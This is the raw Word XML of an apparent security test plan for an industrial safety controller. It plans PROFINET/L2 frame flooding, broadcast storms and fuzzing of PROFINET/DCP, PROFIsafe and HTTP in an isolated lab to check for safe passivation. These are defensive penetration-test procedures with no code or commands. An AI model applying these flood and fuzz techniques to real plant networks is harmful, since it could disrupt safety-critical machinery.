    <w:p w14:paraId="58400531" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:pict w14:anchorId="60F201B1">
          <v:rect id="_x0000_i1682" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B141D77" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 2 — Methodological Test Planning (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DBB30F4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RQ-010 </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>executes</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the generalized flood/fuzz tests (its own), and </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>aggregates outcomes</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> from the cross-referenced RQ-001/RQ-005/RQ-011 tests. It does </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> re-test firmware protection or connecting-device spoofing.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"/>
        <w:gridCol w:w="3966"/>
        <w:gridCol w:w="1926"/>
        <w:gridCol w:w="2226"/>
        <w:gridCol w:w="626"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="1D50D3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51C87F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859165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27A0B1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4C6757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 xml:space="preserve">Scientific </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357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25418E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SVV</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="11AC9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82930" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357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0F0F3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>Baseline resilience</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">: nominal </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> exchange under rated Net Load Class III conditions; confirm stable OPERATE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8844E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t>Functional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baseline</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> CR 7.1/7.2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858A4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Requirements-based; PROFINET Net Load Class III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D36D0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SVV-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="2B9A2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8F05C" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357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9BCC8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>PROFINET/L2 flood</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (RQ-010-owned; receives RQ-001/RQ-007 deferrals): high-rate frame flood; observe safe-comms vs safe-passivation vs undefined state; sustain to test repeated passivation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C29D0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Proves</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> G-1/G-2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CCC6E" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">MITRE </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>T0814</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">; NIST SP 800-115 §5.2; ifm </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>CM-009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B76D2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SVV-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="4AE5D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5F681" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357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E9A30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Protocol </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>fuzzing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> (RQ-010-owned): </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>malformed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> PROFINET/DCP + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> + HTTP; monitor crash/hang </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>vs</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> safe </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>rejection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E0FC9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Proves</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> CR 3.5/3.7</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>characterises</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> G-1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605EAB" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">OWASP FSTM Stage 7; ifm </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>CM-010</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>boofuzz</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">); MITRE </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>T0836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CBF5B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SVV-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="699A8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01335" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357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DD05E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>IoT-Core application-layer flood</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (RQ-010-owned): request flood; confirm COM-path attack does not reach the safety path (domain separation)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F6039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t>Confirms</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> Asset F </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>resilience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B156A" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">ifm </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>CM-009</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> (Siege); NIST SP 800-115 §4.3; MITRE </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>T0814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171E1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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="4C426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5E2CB" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>TS-5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A6DE5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>Outcome-verification harness</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (RQ-010-owned aggregation): for TS-2/3/4 </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>and</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> cross-referenced </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>TC-RQ001-02 (spoofing)</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>TC-RQ005-03 (firmware)</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>, positively confirm outputs = Low + qualifier bad (CR 3.6) — or flag hazardous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6D676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The EHSR </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>success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t>criterion</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>surfaces</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> G-3 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>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E58C4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 xml:space="preserve">Requirements-based + threat-mitigation; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> passivation theory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02042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SVV-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="29A88601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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Boundary note:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> firmware-corruption is </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not re-tested here</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (→ RQ-005 TC-RQ005-03); connecting-device spoofing is </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not re-tested here</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (→ RQ-001 TC-RQ001-02); unauthenticated DCP is </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not re-tested here</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (→ RQ-011 TC-RQ011-02). RQ-010's TS-5 </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>consumes their outcomes</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> into the aggregate hazard matrix.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41299B65" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Environment binding: TS-2/TS-3/TS-4 active flood/fuzz on the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Pi</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (eth0 OT-side / </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>mgmt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as appropriate); passive verification on the laptop mirror; isolated Zone-B, PLC watchdog; </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>flood/fuzz tools on the Pi only.</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId255" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId256" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="743B5305" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:pict w14:anchorId="3F37BD97">
          <v:rect id="_x0000_i1683" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="22ECE526" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Step 3 — Two-Level Test Catalog (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="751F9FDE" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Full entries for the flood-resilience proof (TS-2 → G-1/G-2), the fuzzing-robustness proof (TS-3 → CR 3.5/3.7), and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>outcome-verification aggregation harness</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (TS-5 → EHSR success criterion, incl. the G-3 exception). </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve">TS-1/TS-4 per </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>established</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>templates</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59450946" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:pict w14:anchorId="58711EF9">
          <v:rect id="_x0000_i1684" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="4881A58F" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ010-02 — PROFINET/L2 Flood Resilience (G-1 / G-2 proof; receives RQ-001/RQ-007 deferrals)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B944B4" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357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765"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="510CF7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8D7A7E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A10A18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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="56E30C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AB547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96E23" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>TC-RQ010-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="3D454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7729E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50F36" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>RQ-010 (EHSR 1.1.9 §3) → CR 7.1(RE1) / CR 7.2 / CR 3.6 → Asset H, Asset A, Asset F, Asset E</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="5B7D5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87309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1EAE6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Denial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t>of</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> Service (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>flooding</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="6FE7F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6A10D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SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC635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D64FC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SVV-4</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> (Penetration </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="084FD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0E2DE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C1F76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 xml:space="preserve">Determine </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>behaviour</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> under a high-rate network flood on the OT segment: (a) maintain safe communication (Net Load Class III robustness), (b) passivate to the defined safe state, or (c) enter an undefined/hazardous state? And does sustained flooding cause </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>continuous forced passivation</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (availability impact)?</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="023FB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60889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Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357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25A52" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">1. Establish OPERATE. 2. Apply an escalating frame flood (unicast 0x8892 + broadcast storm). 3. Continuously monitor </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> qualifier, output state, device state. 4. Sustain the flood; measure recovery vs continuous passivation. </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">5. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
